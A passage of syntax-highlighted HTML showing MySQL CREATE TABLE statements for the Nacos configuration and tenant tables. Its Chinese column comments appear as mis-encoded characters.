class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `config_info` (<br>  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">&#x27;id&#x27;</span>,<br>  `data_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;data_id&#x27;</span>,<br>  `group_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `content` longtext <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;content&#x27;</span>,<br>  `md5` <span class="hljs-type">varchar</span>(<span class="hljs-number">32</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;md5&#x27;</span>,<br>  `gmt_create` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;åˆ›å»ºæ—¶é—´&#x27;</span>,<br>  `gmt_modified` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;ä¿®æ”¹æ—¶é—´&#x27;</span>,<br>  `src_user` text COMMENT <span class="hljs-string">&#x27;source user&#x27;</span>,<br>  `src_ip` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;source ip&#x27;</span>,<br>  `app_name` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `tenant_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;ç§Ÿæˆ·å­—æ®µ&#x27;</span>,<br>  `c_desc` <span class="hljs-type">varchar</span>(<span class="hljs-number">256</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `c_use` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `effect` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `type` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `c_schema` text,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),<br>  <span class="hljs-keyword">UNIQUE</span> KEY `uk_configinfo_datagrouptenant` (`data_id`,`group_id`,`tenant_id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8_bin COMMENT<span class="hljs-operator">=</span><span class="hljs-string">&#x27;config_info&#x27;</span>;<br><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-comment">/*   æ•°æ®åº“å…¨å = nacos_config   */</span><br><span class="hljs-comment">/*   è¡¨åç§° = config_info_aggr   */</span><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `config_info_aggr` (<br>  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">&#x27;id&#x27;</span>,<br>  `data_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;data_id&#x27;</span>,<br>  `group_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;group_id&#x27;</span>,<br>  `datum_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;datum_id&#x27;</span>,<br>  `content` longtext <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;å†…å®¹&#x27;</span>,<br>  `gmt_modified` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;ä¿®æ”¹æ—¶é—´&#x27;</span>,<br>  `app_name` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `tenant_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;ç§Ÿæˆ·å­—æ®µ&#x27;</span>,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),<br>  <span class="hljs-keyword">UNIQUE</span> KEY `uk_configinfoaggr_datagrouptenantdatum` (`data_id`,`group_id`,`tenant_id`,`datum_id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8_bin COMMENT<span class="hljs-operator">=</span><span class="hljs-string">&#x27;å¢åŠ ç§Ÿæˆ·å­—æ®µ&#x27;</span>;<br><br><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-comment">/*   æ•°æ®åº“å…¨å = nacos_config   */</span><br><span class="hljs-comment">/*   è¡¨åç§° = config_info_beta   */</span><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `config_info_beta` (<br>  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">&#x27;id&#x27;</span>,<br>  `data_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;data_id&#x27;</span>,<br>  `group_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;group_id&#x27;</span>,<br>  `app_name` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;app_name&#x27;</span>,<br>  `content` longtext <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;content&#x27;</span>,<br>  `beta_ips` <span class="hljs-type">varchar</span>(<span class="hljs-number">1024</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;betaIps&#x27;</span>,<br>  `md5` <span class="hljs-type">varchar</span>(<span class="hljs-number">32</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;md5&#x27;</span>,<br>  `gmt_create` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;åˆ›å»ºæ—¶é—´&#x27;</span>,<br>  `gmt_modified` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;ä¿®æ”¹æ—¶é—´&#x27;</span>,<br>  `src_user` text COMMENT <span class="hljs-string">&#x27;source user&#x27;</span>,<br>  `src_ip` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;source ip&#x27;</span>,<br>  `tenant_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;ç§Ÿæˆ·å­—æ®µ&#x27;</span>,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),<br>  <span class="hljs-keyword">UNIQUE</span> KEY `uk_configinfobeta_datagrouptenant` (`data_id`,`group_id`,`tenant_id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8_bin COMMENT<span class="hljs-operator">=</span><span class="hljs-string">&#x27;config_info_beta&#x27;</span>;<br><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-comment">/*   æ•°æ®åº“å…¨å = nacos_config   */</span><br><span class="hljs-comment">/*   è¡¨åç§° = config_info_tag   */</span><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `config_info_tag` (<br>  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">&#x27;id&#x27;</span>,<br>  `data_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;data_id&#x27;</span>,<br>  `group_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;group_id&#x27;</span>,<br>  `tenant_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;tenant_id&#x27;</span>,<br>  `tag_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;tag_id&#x27;</span>,<br>  `app_name` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;app_name&#x27;</span>,<br>  `content` longtext <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;content&#x27;</span>,<br>  `md5` <span class="hljs-type">varchar</span>(<span class="hljs-number">32</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;md5&#x27;</span>,<br>  `gmt_create` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;åˆ›å»ºæ—¶é—´&#x27;</span>,<br>  `gmt_modified` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;ä¿®æ”¹æ—¶é—´&#x27;</span>,<br>  `src_user` text COMMENT <span class="hljs-string">&#x27;source user&#x27;</span>,<br>  `src_ip` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;source ip&#x27;</span>,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),<br>  <span class="hljs-keyword">UNIQUE</span> KEY `uk_configinfotag_datagrouptenanttag` (`data_id`,`group_id`,`tenant_id`,`tag_id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8_bin COMMENT<span class="hljs-operator">=</span><span class="hljs-string">&#x27;config_info_tag&#x27;</span>;<br><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-comment">/*   æ•°æ®åº“å…¨å = nacos_config   */</span><br><span class="hljs-comment">/*   è¡¨åç§° = config_tags_relation   */</span><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `config_tags_relation` (<br>  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;id&#x27;</span>,<br>  `tag_name` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;tag_name&#x27;</span>,<br>  `tag_type` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;tag_type&#x27;</span>,<br>  `data_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;data_id&#x27;</span>,<br>  `group_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;group_id&#x27;</span>,<br>  `tenant_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;tenant_id&#x27;</span>,<br>  `nid` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`nid`),<br>  <span class="hljs-keyword">UNIQUE</span> KEY `uk_configtagrelation_configidtag` (`id`,`tag_name`,`tag_type`),<br>  KEY `idx_tenant_id` (`tenant_id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8_bin COMMENT<span class="hljs-operator">=</span><span class="hljs-string">&#x27;config_tag_relation&#x27;</span>;<br><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-comment">/*   æ•°æ®åº“å…¨å = nacos_config   */</span><br><span class="hljs-comment">/*   è¡¨åç§° = group_capacity   */</span><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `group_capacity` (<br>  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">&#x27;ä¸»é”®ID&#x27;</span>,<br>  `group_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;Group IDï¼Œç©ºå­—ç¬¦è¡¨ç¤ºæ•´ä¸ªé›†ç¾¤&#x27;</span>,<br>  `quota` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;é…é¢ï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼&#x27;</span>,<br>  `usage` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;ä½¿ç”¨é‡&#x27;</span>,<br>  `max_size` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;å•ä¸ªé…ç½®å¤§å°ä¸Šé™ï¼Œå•ä½ä¸ºå­—èŠ‚ï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼&#x27;</span>,<br>  `max_aggr_count` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;èšåˆå­é…ç½®æœ€å¤§ä¸ªæ•°ï¼Œï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼&#x27;</span>,<br>  `max_aggr_size` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;å•ä¸ªèšåˆæ•°æ®çš„å­é…ç½®å¤§å°ä¸Šé™ï¼Œå•ä½ä¸ºå­—èŠ‚ï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼&#x27;</span>,<br>  `max_history_count` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;æœ€å¤§å˜æ›´å†å²æ•°é‡&#x27;</span>,<br>  `gmt_create` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;åˆ›å»ºæ—¶é—´&#x27;</span>,<br>  `gmt_modified` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;ä¿®æ”¹æ—¶é—´&#x27;</span>,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),<br>  <span class="hljs-keyword">UNIQUE</span> KEY `uk_group_id` (`group_id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8_bin COMMENT<span class="hljs-operator">=</span><span class="hljs-string">&#x27;é›†ç¾¤ã€å„Groupå®¹é‡ä¿¡æ¯è¡¨&#x27;</span>;<br><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-comment">/*   æ•°æ®åº“å…¨å = nacos_config   */</span><br><span class="hljs-comment">/*   è¡¨åç§° = his_config_info   */</span><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `his_config_info` (<br>  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">64</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>  `nid` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,<br>  `data_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>  `group_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>  `app_name` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;app_name&#x27;</span>,<br>  `content` longtext <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>  `md5` <span class="hljs-type">varchar</span>(<span class="hljs-number">32</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `gmt_create` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,<br>  `gmt_modified` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,<br>  `src_user` text,<br>  `src_ip` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `op_type` <span class="hljs-type">char</span>(<span class="hljs-number">10</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `tenant_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;ç§Ÿæˆ·å­—æ®µ&#x27;</span>,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`nid`),<br>  KEY `idx_gmt_create` (`gmt_create`),<br>  KEY `idx_gmt_modified` (`gmt_modified`),<br>  KEY `idx_did` (`data_id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8_bin COMMENT<span class="hljs-operator">=</span><span class="hljs-string">&#x27;å¤šç§Ÿæˆ·æ”¹é€ &#x27;</span>;<br><br><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-comment">/*   æ•°æ®åº“å…¨å = nacos_config   */</span><br><span class="hljs-comment">/*   è¡¨åç§° = tenant_capacity   */</span><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `tenant_capacity` (<br>  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">&#x27;ä¸»é”®ID&#x27;</span>,<br>  `tenant_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;Tenant ID&#x27;</span>,<br>  `quota` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;é…é¢ï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼&#x27;</span>,<br>  `usage` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;ä½¿ç”¨é‡&#x27;</span>,<br>  `max_size` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;å•ä¸ªé…ç½®å¤§å°ä¸Šé™ï¼Œå•ä½ä¸ºå­—èŠ‚ï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼&#x27;</span>,<br>  `max_aggr_count` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;èšåˆå­é…ç½®æœ€å¤§ä¸ªæ•°&#x27;</span>,<br>  `max_aggr_size` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;å•ä¸ªèšåˆæ•°æ®çš„å­é…ç½®å¤§å°ä¸Šé™ï¼Œå•ä½ä¸ºå­—èŠ‚ï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼&#x27;</span>,<br>  `max_history_count` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;æœ€å¤§å˜æ›´å†å²æ•°é‡&#x27;</span>,<br>  `gmt_create` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;åˆ›å»ºæ—¶é—´&#x27;</span>,<br>  `gmt_modified` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;ä¿®æ”¹æ—¶é—´&#x27;</span>,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),<br>  <span class="hljs-keyword">UNIQUE</span> KEY `uk_tenant_id` (`tenant_id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8_bin COMMENT<span class="hljs-operator">=</span><span class="hljs-string">&#x27;ç§Ÿæˆ·å®¹é‡ä¿¡æ¯è¡¨&#x27;</span>;<br><br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `tenant_info` (<br>  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">&#x27;id&#x27;</span>,<br>  `kp` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;kp&#x27;</span>,<br>  `tenant_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">default</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;tenant_id&#x27;</span>,<br>  `tenant_name` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">default</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;tenant_name&#x27;</span>,<br>  `tenant_desc` <span class="hljs-type">varchar</span>(<span class="hljs-number">256</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;tenant_desc&#x27;</span>,<br>  `create_source` <span class="hljs-type">varchar</span>(<span class="hljs-number">32</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;create_source&#x27;</span>,<br>  `gmt_create` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span 